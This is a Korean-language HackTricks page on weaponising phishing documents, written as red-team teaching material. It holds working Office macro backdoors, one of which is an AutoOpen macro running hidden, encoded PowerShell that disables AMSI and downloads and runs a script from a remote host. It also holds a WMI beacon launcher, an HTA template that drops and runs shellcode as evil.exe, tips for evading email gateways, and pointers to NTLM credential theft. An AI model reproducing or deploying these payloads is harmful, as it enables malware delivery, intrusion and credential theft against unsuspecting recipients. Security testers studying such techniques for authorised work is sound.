# 피싱 파일 및 문서

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사가 HackTricks에 광고**되길 원하시나요? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks) 및 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

## 오피스 문서

Microsoft Word는 파일을 열기 전에 파일 데이터 유효성 검사를 수행합니다. 데이터 유효성 검사는 OfficeOpenXML 표준에 따라 데이터 구조 식별 형태로 수행됩니다. 데이터 구조 식별 중에 오류가 발생하면 분석 중인 파일이 열리지 않습니다.

일반적으로 매크로를 포함하는 Word 파일은 `.docm` 확장자를 사용합니다. 그러나 파일 확장자를 변경하여 파일 이름을 변경하면 여전히 매크로 실행 기능을 유지할 수 있습니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, RTF로 이름이 변경된 DOCM 파일은 Microsoft Word에서 처리되며 매크로 실행이 가능합니다.\
동일한 내부 및 메커니즘은 Microsoft Office Suite의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

다음 명령을 사용하여 Office 프로그램에서 실행될 확장자를 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
### 외부 이미지 로드

이동: _삽입 --> 빠른 부분 --> 필드_\
_**카테고리**: 링크 및 참조, **필드 이름**: includePicture, **파일 이름 또는 URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (316).png>)

### 매크로 백도어

문서에서 임의의 코드를 실행하기 위해 매크로를 사용할 수 있습니다.

#### 자동로드 함수

이들이 더 일반적이면, AV가 그들을 감지할 가능성이 더 높습니다.

* AutoOpen()
* Document\_Open()

#### 매크로 코드 예제
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동으로 제거하기

**파일 > 정보 > 문서 검사 > 문서 검사**로 이동하여 문서 검사기를 열어주세요. **검사**를 클릭한 다음 **문서 속성 및 개인 정보** 옆의 **모두 제거**를 클릭합니다.

#### 문서 확장자

작업을 마치면 **"다른 이름으로 저장"** 드롭다운에서 **`.docx`** 형식을 **Word 97-2003 `.doc`**로 변경하세요.\
이렇게 하면 **매크로를 `.docx` 안에 저장할 수 없기 때문에** 매크로가 있는 **`.docm`** 확장자에 대한 **편견**이 있습니다 (예: 썸네일 아이콘에 큰 `!`가 표시되며 일부 웹/이메일 게이트웨이에서 완전히 차단됩니다). 따라서 이 **레거시 `.doc` 확장자가 최상의 타협안**입니다.

#### 악성 매크로 생성기

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA 파일

HTA는 HTML과 VBScript 및 JScript와 같은 스크립팅 언어를 **결합한 Windows 프로그램**입니다. 이는 사용자 인터페이스를 생성하고 브라우저의 보안 모델 제약 없이 "완전히 신뢰할 수 있는" 응용 프로그램으로 실행됩니다.

HTA는 일반적으로 **Internet Explorer와 함께 설치되는** **`mshta.exe`**를 사용하여 실행됩니다. 따라서 **`mshta`는 IE에 의존**합니다. 따라서 IE가 제거되면 HTA를 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 인증 강제하기

원격으로 NTLM 인증을 강제하는 여러 가지 방법이 있습니다. 예를 들어, 사용자가 액세스하는 이메일이나 HTML에 **보이지 않는 이미지**를 추가하거나 (심지어 HTTP MitM을 통해?) 희생자에게 **인증을 트리거하는 파일의 주소**를 보내서 **폴더를 열 때 인증을 유발**시킬 수 있습니다.

**다음 페이지에서 이러한 아이디어와 더 많은 것을 확인하세요:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM 릴레이

해시나 인증 정보를 훔칠 수 있는 것뿐만 아니라 **NTLM 릴레이 공격**도 수행할 수 있다는 것을 잊지 마세요:

* [**NTLM 릴레이 공격**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (인증서로 NTLM 릴레이)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하고 계신가요? **회사를 HackTricks에서 홍보**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
